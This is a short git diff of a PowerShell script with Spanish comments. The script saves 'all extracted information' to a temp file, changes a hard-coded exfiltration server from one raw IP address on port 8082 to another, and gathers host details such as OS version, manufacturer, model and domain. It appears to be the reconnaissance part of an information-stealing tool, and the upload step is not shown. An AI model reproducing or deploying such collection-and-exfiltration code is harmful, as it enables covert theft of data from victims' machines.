@@ -1,6 +1,6 @@
 # Crear archivo donde se guardara toda la informacion extraida
 $cont = "$env:TEMP/data_msg.txt" 
-$server = "http://184.73.137.6:8082"
+$server = "http://3.82.154.155:8082/"
 
 # INformación general del sistema 
 systeminfo | Where-Object { $_ -match "^(Nombre del sistema operativo|Versión del sistema operativo|Fabricante del sistema|Modelo del sistema|Dominio|Modelo el sistema|OS Name|OS Version|System Manufacturer|System Model|Domain):" } > $cont
